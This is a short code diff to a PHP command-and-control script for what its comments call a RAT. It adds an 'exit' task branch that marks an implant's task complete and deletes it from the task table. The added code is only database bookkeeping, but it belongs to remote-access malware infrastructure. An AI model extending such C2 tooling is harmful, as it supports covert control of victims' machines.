@@ -115,5 +115,28 @@
       # Kills database connection
       $statement->connection = null;   
     }
+
+    # Else if the task action is an implant exit
+    elseif ($taskAction == "exit")
+    {
+      # Updates status to "Y" in "output" table
+      # This informs the RAT user that the task completed
+      $statement = $dbConnection->prepare("UPDATE output SET status = :status WHERE id = :id AND action = :action AND secondary = :secondary");
+      $statement->bindValue(":status", "Y");
+      $statement->bindValue(":id", $taskID);
+      $statement->bindValue(":action", $taskAction);
+      $statement->bindValue(":secondary", $taskSecondary);
+      $statement->execute();
+
+      # Deletes task from "task" table       
+      $statement = $dbConnection->prepare("DELETE FROM tasks WHERE id = :id AND action = :action AND secondary = :secondary");
+      $statement->bindValue(":id", $taskID);
+      $statement->bindValue(":action", $taskAction);
+      $statement->bindValue(":secondary", $taskSecondary);
+      $statement->execute();
+
+      # Kills database connection
+      $statement->connection = null;   
+    }
   }
 ?>
